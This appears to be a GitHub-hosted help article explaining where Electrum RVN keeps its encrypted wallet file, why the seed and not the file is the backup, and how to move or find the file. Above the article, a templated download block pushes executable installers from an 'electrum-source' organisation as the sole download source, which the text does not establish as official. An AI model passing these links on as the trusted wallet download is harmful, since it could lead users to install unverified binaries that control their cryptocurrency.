![Electrum RVN](assets/banner-article.png)

# Where Electrum RVN Stores Your Wallet

<!-- compact-download-block -->

<p align="center">The folder that holds your encrypted keys</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
The wallet file lives in your user profile, in the application's wallet directory, named after the wallet you created. It holds the encrypted keys plus the labels and local history the wallet keeps alongside them. The seed is not stored there - it exists on the paper you wrote it on, which is why losing the file is survivable and losing the paper is not.

## The location, per platform

| Platform | Where to look |
| --- | --- |
| Windows | your user profile, under the application's data folder - `%APPDATA%` for this wallet |
| macOS | your home folder, under `Library/Application Support`, in the wallet's folder |
| Linux | your home folder, under `.electrum-rvn` or the application's data directory |

Exact folder names differ between builds, so use the application's own "open wallet directory" action where it exists, or search your profile for the wallet name you chose. The important point is structural: it is in **your user profile**, not in the installation folder and not in a system directory.

That placement is what lets an update replace the program without touching your keys; removal is a separate decision, and the folder is worth checking rather than assuming. [Updating to the latest release](https://github.com/electrum-source/download-and-setup/blob/main/update-electrum-rvn-to-the-latest-release.md) and [removing Electrum RVN from your computer](https://github.com/electrum-source/download-and-setup/blob/main/removing-electrum-rvn-from-your-computer.md) both depend on that distinction.

## What is in the file

- **Encrypted private keys**, derived from the seed.
- **Addresses and their labels**, which are local to the wallet rather than published on the chain.
- **Local transaction history**, a convenience copy of what the chain already knows.
- **Wallet settings**, including the derivation path the wallet uses.

What is *not* in the file: the seed phrase in readable form, your password, or any copy on a server. The file is self-contained and local, and it is only as safe as the password protecting it - [wallet file encryption in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/wallet-file-encryption-in-electrum-rvn.md).

## Why the file is not a backup

A backup is a copy that survives the failure you are protecting against. The wallet file protects you against a corrupted profile; it does not protect you against a dead disk, a stolen laptop or a house fire, because it lives on the same machine and in the same building.

The seed protects you against all three. It is twelve words, generated on your machine, that derive the same keys anywhere - [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md). The file is a convenience; the paper is the backup.

There is one exception worth knowing: if you have *only* the file and have forgotten the password, the file is a locked box, and the seed is the only way in - [forgot your Electrum RVN password?](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md).

## Copying the file: when it helps, when it hurts

Copying the file to a second disk is a reasonable extra layer for a machine you are about to service, and it is what a migration uses. Two cautions:

**A copy is a copy of keys.** An unencrypted wallet file on a USB stick is a wallet anyone can open. Keep it encrypted and keep it where a burglar would not look first.

**Do not sync it to a cloud folder.** A wallet directory inside a synced folder is a copy on someone else's server, protected only by your password. That defeats the point of a local key store, and it is how a forgotten password becomes a permanent loss when the local file is deleted and the sync deletes its copy too.

## Moving to a new machine

Two routes, and the seed route is the one that always works:

1. **Restore from the seed** on the new machine, wait for the rescan, check the balance. Labels and history do not come back; addresses and funds do.
2. **Copy the wallet file** to the same relative location on the new machine, then open it with the same password. This keeps labels and history, and it is the faster migration - but only when both machines are yours and the transfer is a cable, not a chat app.

Whichever you use, keep the old machine's copy until the new one shows the correct balance. [Moving Electrum RVN to another computer](https://github.com/electrum-source/passphrase-backup/blob/main/moving-electrum-rvn-to-another-computer.md) is the ordered version.

## Finding a wallet you forgot you had

Search your profile for the wallet name, or for the application's folder, rather than for "wallet.dat" - names are user-chosen and usually memorable. If the application opens with no wallet loaded, its recent-wallets list is a faster index than a filesystem search.

If the file is gone and the seed is not, restore. If the seed is gone and the file is not, keep the file and treat the password as the priority: it is the only remaining way in, and the balance is one disk failure from gone.

## The short version

The file lives in your profile, encrypted, and it is replaceable by the seed. Write the seed down, test the restore once, keep the file where only you can read it, and never let a sync service hold the only copy.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [What data does Electrum RVN collect?](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-data-collection.md) covers what leaves the machine, and [restore a wallet from an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md) is the path that does not depend on this file at all.

## FAQ

### What is the wallet file called?

Whatever you named the wallet when you created it, with the application's own extension. That is why searching for a generic filename is a poor way to find it.

### Is the wallet file the same as the seed?

No. The file carries the encrypted keys the seed derives, plus the labels and history the wallet keeps locally. The seed can recreate the keys anywhere; the file cannot recreate the seed.

### Can I move the file to another computer?

Yes, when both machines are yours. Copy it to the same location, open it with the same password, and keep the original until the new machine shows the balance.

### Is it safe to keep the file in cloud storage?

Only if you accept that a copy of your encrypted keys sits on someone else's server. It is not a backup strategy, and a sync conflict can delete the only local copy.

### What if the file is deleted?

Restore from the seed, and the balance returns. Labels and local history do not, because they were only in the file.

<!-- related-articles -->

## Related articles

- [Update Electrum RVN to the Latest Release](https://github.com/electrum-source/download-and-setup/blob/main/update-electrum-rvn-to-the-latest-release.md)
- [Removing Electrum RVN From Your Computer](https://github.com/electrum-source/download-and-setup/blob/main/removing-electrum-rvn-from-your-computer.md)
- [Wallet File Encryption in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/wallet-file-encryption-in-electrum-rvn.md)
- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
